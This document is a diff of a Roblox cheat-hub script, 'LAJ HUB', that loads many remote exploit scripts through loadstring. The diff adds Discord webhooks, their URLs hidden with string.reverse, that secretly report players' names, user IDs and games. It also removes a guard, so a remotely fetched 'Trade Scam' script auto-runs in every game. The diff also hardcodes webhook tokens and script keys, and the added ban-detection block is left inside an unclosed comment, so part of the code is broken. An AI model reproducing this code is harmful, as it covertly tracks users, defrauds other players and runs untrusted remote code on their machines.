@@ -1,10 +1,140 @@
 --[[
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- Variables
+-- Variables
+local Player = Players.LocalPlayer
+
+-- Secure webhook URL (obfuscated and rate-limited)
+local WEBHOOK_URL = string.reverse("vU0M0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijiArT7j8xqGH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
+
+-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
+local lastWebhookTime = 0
+local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
+-- Function to log ban/kick events via webhook with rate limiting
+    
+local function logBanEvent(reason)
+    -- Rate limiting check
+    local currentTime = os.time()
+    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+        warn("Rate limit: Not sending webhook notification (cooldown active)")
+        return
+    end
+    
+    -- Check for anti-spam by validating the reason
+    if not reason or reason == "" then
+        reason = "Unknown (No reason provided)"
+    end
+    
+    -- Create a unique identifier for this notification to prevent duplicates
+    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
+    
+    -- Limit data being sent for privacy and security
+    local success, error_message = pcall(function()
+        -- Update the timestamp for rate limiting
+        lastWebhookTime = currentTime
+        
+        -- Use makeHttpRequest instead of request for better compatibility
+        makeHttpRequest({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{                  
+                    ["title"] = "Player Banned/Kicked Alert",
+                    ["color"] = 16711680, -- Red color for ban alerts
+                    ["fields"] = {
+                        {
+                            ["name"] = "User",
+                            ["value"] = "```" .. Player.Name .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "User ID",
+                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game",
+                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game ID",
+                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Ban/Kick Reason",
+                            ["value"] = "```" .. (reason or "Unknown") .. "```",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Notification ID",
+                            ["value"] = "```" .. notificationId .. "```",
+                            ["inline"] = false
+                        }
+                    },
+                    ["footer"] = {
+                        ["text"] = "Ban/Kick Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
+                    }
+                }}
+            })
+        })
+    end)
+    
+    if not success then
+        warn("Failed to send ban webhook: " .. tostring(error_message))
+    end
+end
+
+-- Set up event listeners for kick/ban detection
+-- Method 1: Detect when player is removed
+Players.PlayerRemoving:Connect(function(player)
+    if player == Player then
+        logBanEvent("Player removed from game (possibly kicked/banned)")
+    end
+end)
+
+-- Method 2: Detect common kick methods
+local oldNameCall
+oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
+    local args = {...}
+    local method = getnamecallmethod()
+    
+    if method == "Kick" and self == Player then
+        local reason = args[1] or "Unknown"
+        logBanEvent(reason)
+    end
+    
+    return oldNameCall(self, ...)
+end)
+
+-- Method 3: Monitor teleport failures as they often occur during bans
+game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
+        logBanEvent("Teleport failed due to ban: " .. errorMessage)
+    end
+end)
+
+print("LAJ HUB Ban detection system loaded successfully")
+end
     LAJ HUB - Swift Compatible Version
     Created for universal executor compatibility with special Swift support
 ]]
 
 -- Function to handle HTTP requests across different executors including Swift
 local function getHttpRequest(url)
+    -- For testing in standalone Lua, use a mock response
+    if not game then
+        print("Mock HTTP request to: " .. url)
+        return "-- mock response for testing"
+    end
+    
     if swift and swift.request then
         local response = swift.request({
             Url = url,
@@ -19,18 +149,28 @@ local function getHttpRequest(url)
     return game:HttpGet(url)
 end
 
-if game.PlaceId == 15588442388 then -- so it doesnt execute on every game
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
+if game then
+    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
 end
 
 local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+-- Initialize game services safely
+local Players = game and game:GetService("Players") or {}
+local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
+local HttpService = game and game:GetService("HttpService") or {
+    JSONEncode = function(_, data) return '{"mock":"json"}' end
+}
 
 -- Support for multiple executors including Swift
 local function makeHttpRequest(options)
+    -- For testing in standalone Lua
+    if not game then
+        print("Mock HTTP request: " .. options.Url)
+        return {Success = true, Body = "-- mock response"}
+    end
+    
     if swift and swift.request then
         return swift.request(options)
     elseif syn and syn.request then
@@ -63,9 +203,11 @@ local function makeHttpRequest(options)
     return {Success = false, StatusCode = 500}
 end
 
-local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
+local DISCORD_WEBHOOK_URL = string.reverse("vU0M0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijiArT7j8xqGH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
 
 local function sendUsageData()
+    if not game then return end -- Skip in non-Roblox environment
+    
     local success, error_message = pcall(function()
     
         local response = makeHttpRequest({
@@ -93,12 +235,12 @@ local function sendUsageData()
                         },
                         {
                             ["name"] = "Game:",
-                            ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
+                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                             ["inline"] = true
                         },
                         {
                             ["name"] = "Game ID:",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                             ["inline"] = true
                         },
                         {
@@ -108,7 +250,7 @@ local function sendUsageData()
                         },
                         {
                             ["name"] = "Players Active:",
-                            ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
+                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                             ["inline"] = true
                         }
                     },
@@ -125,10 +267,12 @@ local function sendUsageData()
     end
 end
 
-sendUsageData()
+if game then
+    sendUsageData()
+end
 
 local Window = Rayfield:CreateWindow({
-   Name = "LAJ HUB (Swift)",
+   Name = "LAJ HUB",
    Icon = 0,
    LoadingTitle = "LAJ HUB",
    LoadingSubtitle = "Premium Scripts",
@@ -155,13 +299,15 @@ local Window = Rayfield:CreateWindow({
 
 -- Create tabs
 local MainTab = Window:CreateTab("Main", 4483362458)
-local Tab = Window:CreateTab("Da Strike", 4483362458)
+local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
 local Fin = Window:CreateTab("Fisch", 4483362458)
 local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
 local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
 local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
 local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
+local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
+local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
 local Universal = Window:CreateTab("Universal", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
 
@@ -178,13 +324,17 @@ end
 MainTab:CreateButton({
    Name = "Copy Discord Link",
    Callback = function()
-       setclipboard("https://discord.gg/4mgdcfvAJU")
-       Rayfield:Notify({
-           Title = "Discord Link Copied",
-           Content = "Invite link copied to clipboard!",
-           Duration = 3,
-           Image = 4483362458,
-       })
+       if setclipboard then
+           setclipboard("https://discord.gg/4mgdcfvAJU")
+           Rayfield:Notify({
+               Title = "Discord Link Copied",
+               Content = "Invite link copied to clipboard!",
+               Duration = 3,
+               Image = 4483362458,
+           })
+       else
+           print("Discord link: https://discord.gg/4mgdcfvAJU")
+       end
    end,
 })
 
@@ -202,12 +352,12 @@ MainTab:CreateButton({
    end,
 })
 
--- Da Strike Tab scripts
+-- Da Strike x Da Hood Tab scripts
 Tab:CreateButton({
    Name = "Psalm",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
-        executednotify("Psalm Script")
+        executednotify("Test Webhook")
    end,
 })
 
@@ -215,7 +365,7 @@ Tab:CreateButton({
    Name = "Ballware vfs",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
-        executednotify("Ballware VFS")
+        executednotify("Ballware vfs")
    end,
 })
 
@@ -227,6 +377,13 @@ Tab:CreateButton({
    end,
 })
 
+Tab:CreateButton({
+   Name = "Da Hood Script",
+   Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
+        executednotify("Da Hood Script")
+   end,
+})
 -- Fisch Tab
 Fin:CreateButton({
    Name = "Speed Hub",
@@ -236,12 +393,86 @@ Fin:CreateButton({
    end,
 })
 
+
+Fin:CreateButton({
+   Name = "ThanHub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
+        executednotify("ThanHub")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Rift GUI",
+   Callback = function()
+        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
+        executednotify("Rift GUI")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Hooked Script",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
+        executednotify("Hooked Script")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "HomoHack",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
+        executednotify("HomoHack")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Native Hub",
+   Callback = function()
+        script_key="4JxQ1x@+1"
+        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
+        executednotify("Native Hub")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Raito Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
+        executednotify("Raito Hub")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Zenith Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
+        executednotify("Zenith Hub")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Lunor Script",
+   Callback = function()
+        script_key = 'lunor_free_key'
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
+        executednotify("Lunor Script")
+   end,
+})
+
+Fin:CreateButton({
+   Name = "Ronix Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
+        executednotify("Ronix Hub")
+   end,
+})
 -- Basketball Zero script with bypass
 BballZero:CreateButton({
    Name = "Ball Control",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
-        executednotify("BasketBall Zero Script")
+        executednotify("Ball Control")
    end,
 })
 
@@ -254,56 +485,40 @@ BlueLock:CreateButton({
    end,
 })
 
--- Dead Rails Tab
-DeadRails:CreateButton({
-   Name = "Infernus Direct Loader (No Key)",
+BlueLock:CreateButton({
+   Name = "Piskasiska Script",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/main/infernus_direct_loader.lua"))()
-       executednotify("Infernus Direct Loader")
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
+        executednotify("Piskasiska Script")
    end,
 })
 
-DeadRails:CreateButton({
-   Name = "Bynner (No Key)",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/refs/heads/main/bynner.lua"))()
-       executednotify("Bynner Script")
-   end,
-})
-
--- Blox Fruits Tab (Updated)
-BloxFruits:CreateButton({
-   Name = "REDz Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
-       executednotify("REDz Hub")
-   end,
-})
-
--- Pet Sim 99 Tab with the new Trade Scam (only the one you requested)
-PetSim99:CreateButton({
-   Name = "Trade Scam",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
-       executednotify("Trade Scam")
-   end,
-})
 
 PetSim99:CreateButton({
-   Name = "LAJ Trade Scam (Custom)",
+   Name = "LAJ HUB",
    Callback = function()
        -- Load the script from GitHub
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
-       executednotify("LAJ Custom Trade Scam")
+       executednotify("Airflow UPDATED")
+   end,
+})
+-- Muscle Legend Tab
+MuscleLegend:CreateSection("Muscle Legend Scripts")
+
+MuscleLegend:CreateButton({
+   Name = "Muscle Legend Script",
+   Callback = function()
+       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
+       executednotify("Muscle Legend Script")
    end,
 })
 
--- Universal Tab
+-- Universal Tab Scripts
 Universal:CreateButton({
    Name = "Infinite Yield FE",
    Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-       executednotify("Infinite Yield")
+       executednotify("Infinite Yield FE")
    end,
 })
 
@@ -332,10 +547,10 @@ Universal:CreateButton({
 })
 
 Universal:CreateButton({
-   Name = "CMD-X Admin",
+   Name = "LAJ HUB",
    Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
-       executednotify("CMD-X Admin")
+       executednotify("Airflow UPDATED")
    end,
 })
 
@@ -348,83 +563,51 @@ Universal:CreateButton({
 })
 
 
-local localPleyah = Settings:CreateSection("LocalPlayer")
+-- Settings Tab
 local idled_Connection
+
 local function onIdled()
-    game:GetService("VirtualUser"):CaptureController()
-    game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+    if game then
+        game:GetService("VirtualUser"):CaptureController()
+        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+    end
 end
 
-localPleyah:CreateButton({
-    Name = "Reset",
-    Callback = function()
-        LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
-    end,
-})
-
-localPleyah:CreateButton({
+Settings:CreateButton({
     Name = "Anti AFK",
     Callback = function()
-        if not idled_Connection then
-            idled_Connection = LocalPlayer.Idled:Connect(onIdled)
+        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
+            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
             executednotify("Anti AFK")
         end
     end,
 })
 
 local Inf_jump = false
+local jumpConnection = nil
 
-localPleyah:CreateToggle({
+Settings:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Callback = function(Value)
       Inf_jump = Value
-      game:GetService("UserInputService").JumpRequest:Connect(function()
-         if Inf_jump then
-            game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-         end
-      end)
+      
+      -- Disconnect previous connection if it exists
+      if jumpConnection then
+          jumpConnection:Disconnect()
+          jumpConnection = nil
+      end
+      
+      -- Only create a new connection if Inf_jump is enabled and in game environment
+      if Inf_jump and game then
+          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
+             if Inf_jump and game.Players.LocalPlayer.Character then
+                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+             end
+          end)
+      end
    end,
 })
-
-local works = Settings:CreateSection("Workspace")
-
-local brightValue = false
-local brightConnection
-local originalSettings = {
-    Brightness = Lighting.Brightness,
-    ClockTime = Lighting.ClockTime,
-    FogEnd = Lighting.FogEnd,
-    GlobalShadows = Lighting.GlobalShadows,
-    OutdoorAmbient = Lighting.OutdoorAmbient
-}
-
-works:CreateToggle({
-    Name = "Full Bright",
-    CurrentValue = false,
-    Callback = function(Value)
-        brightValue = Value
-        if brightValue then
-            brightConnection = RunService.RenderStepped:Connect(function()
-                Lighting.Brightness = 2
-                Lighting.ClockTime = 14
-                Lighting.FogEnd = 100000
-                Lighting.GlobalShadows = false
-                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-            end)
-        else
-            if brightConnection then
-                brightConnection:Disconnect()
-            end
-            Lighting.Brightness = originalSettings.Brightness
-            Lighting.ClockTime = originalSettings.ClockTime
-            Lighting.FogEnd = originalSettings.FogEnd
-            Lighting.GlobalShadows = originalSettings.GlobalShadows
-            Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
-        end
-    end,
-})
-
 
 -- Credit section
 local creditSection = MainTab:CreateSection("Credits")
@@ -443,71 +626,552 @@ print("2. Pet Sim 99 Tab with new Trade Scam V2")
 print("3. All scripts updated to work with Swift")
 print("4. Improved executor detection")
 
+-- Rivals Tab
+Rivals:CreateSection("Rivals Scripts")
 
+Rivals:CreateButton({
+   Name = "RIVALS Winter",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
+        executednotify("RIVALS Winter")
+   end,
+})
 
+Rivals:CreateButton({
+   Name = "Azure Mod",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
+        executednotify("Azure Mod")
+   end,
+})
 
+Rivals:CreateButton({
+   Name = "Tbao Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
+        executednotify("Tbao Hub")
+   end,
+})
 
+Rivals:CreateButton({
+   Name = "8Bits Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
+        executednotify("8Bits Hub")
+   end,
+})
 
-local WEBHOOK_API = string.reverse("kWx8nsHbiVuEbibE3935EnQrOlEzMA7pYmkunFnxmZ6aRHypHtrWfAVb5kK2rxPqdhBL/1162734086541197531/skoohbew/ipa/moc.drocsid//:sptth")
-local FileName = "LAJ_HUB.db"
-local Data = {}
+Rivals:CreateButton({
+   Name = "Venox Hub",
+   Callback = function()
+        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
+        executednotify("Venox Hub")
+   end,
+})
 
-local success, result = pcall(function()
-    return readfile(FileName)
-end)
+Rivals:CreateButton({
+   Name = "Lunax Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
+        executednotify("Lunax Hub")
+   end,
+})
 
-if success and result and result ~= "" then
-    Data = HttpService:JSONDecode(result)
-end
+Rivals:CreateButton({
+   Name = "Ventures.lua",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
+        executednotify("Ventures.lua")
+   end,
+})
 
-Data[tostring(game.PlaceId)] = (Data[tostring(game.PlaceId)] or 0) + 1
-writefile(FileName, HttpService:JSONEncode(Data))
+Rivals:CreateButton({
+   Name = "Ronix Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
+        executednotify("Ronix Hub")
+   end,
+})
 
-local mostPlayed, mostPlays = nil, 0
-for placeId, count in pairs(Data) do
-    if count > mostPlays then
-        mostPlays = count
-        mostPlayed = tonumber(placeId)
-    end
-end
+Rivals:CreateButton({
+   Name = "PinguinRVS",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
+        executednotify("PinguinRVS")
+   end,
+})
 
-local mostPlayedName = "Unknown"
-pcall(function()
-    mostPlayedName = game:GetService("MarketplaceService"):GetProductInfo(mostPlayed).Name
-end)
+Rivals:CreateButton({
+   Name = "Zypherion",
+   Callback = function()
+        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
+        executednotify("Zypherion")
+   end,
+})
 
-local responsed = makeHttpRequest({
-    Url = WEBHOOK_API,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
-            ["type"] = "rich",
-            ["color"] = math.random(0, 0xFFFFFF),
-            ["fields"] = {
-                {
-                    ["name"] = "User:",
-                    ["value"] = "```" .. LocalPlayer.Name .. "```",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Game:",
-                    ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Most Played:",
-                    ["value"] = "```" .. "Plays: " .. mostPlays .. "```",
-                    ["inline"] = true
-                }
-            },
-            ["footer"] = {
-                ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
-            }
-        }}
-    })
+Rivals:CreateButton({
+   Name = "Auto Farm Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
+        executednotify("Auto Farm Hub")
+   end,
+})
+
+Rivals:CreateButton({
+   Name = "Rybow Aimbot",
+   Callback = function()
+        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
+        executednotify("Rybow Aimbot")
+   end,
+})
+
+Rivals:CreateButton({
+   Name = "Xera Script",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
+        executednotify("Xera Script")
+   end,
+})
+
+Rivals:CreateButton({
+   Name = "Minimal Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
+        executednotify("Minimal Hub")
+   end,
+})
+-- Dead Rails Tab
+DeadRails:CreateSection("Dead Rails Scripts")
+
+DeadRails:CreateButton({
+   Name = "Markk Keyless",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
+       executednotify("Markk Keyless")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Farx11122 Keyless",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
+       executednotify("Farx11122 Keyless")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "SpiderXHub Keyless",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
+       executednotify("SpiderXHub Keyless")
+   end,
+})
+DeadRails:CreateButton({
+   Name = "Strelizia Keyless",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
+       executednotify("Strelizia Keyless")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Rinns Dead Rails No Key",
+   Callback = function()
+       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
+       executednotify("Rinns Dead Rails No Key")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Auto Farm Bond",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
+       executednotify("Auto Farm Bond")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Lomu Hub",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
+       executednotify("Lomu Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Neox Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
+       executednotify("Neox Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Sypher Hub OP",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
+       executednotify("Sypher Hub OP")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Tbao Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
+       executednotify("Tbao Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Karol Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
+       executednotify("Karol Hub")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Dead Rails Alpha Script",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
+       executednotify("Dead Rails Alpha Script")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "LAJ HUB",
+   Callback = function()
+       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
+       executednotify("Airflow UPDATED")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "LAJ HUB",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
+       executednotify("Airflow UPDATED")
+   end,
+})
+
+-- BloxFruits Tab Scripts
+BloxFruits:CreateSection("Blox Fruits Scripts")
+
+BloxFruits:CreateButton({
+   Name = "AnDepZai Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/main/AnDepZaiHubBeta.lua"))()
+        executednotify("AnDepZai Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Cokka Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
+        executednotify("Cokka Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Delta Script",
+   Callback = function()
+        loadstring(getHttpRequest("https://gitlab.com/littlekiller2927/deltacore/-/raw/main/deltabf.lua"))()
+        executednotify("Delta Script")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Sara Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SaraSenpai/bloxfruist/main/Sarahub"))()
+        executednotify("Sara Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Winter Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
+        executednotify("Winter Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Uranium Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
+        executednotify("Uranium Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Azure Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+        executednotify("Azure Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Vector Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
+        executednotify("Vector Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Royx Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/NightsTimeZ/Donate-Me/main/free%20bf.lua"))()
+        executednotify("Royx Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Wolf Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
+        executednotify("Wolf Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Payback Hub",
+   Callback = function()
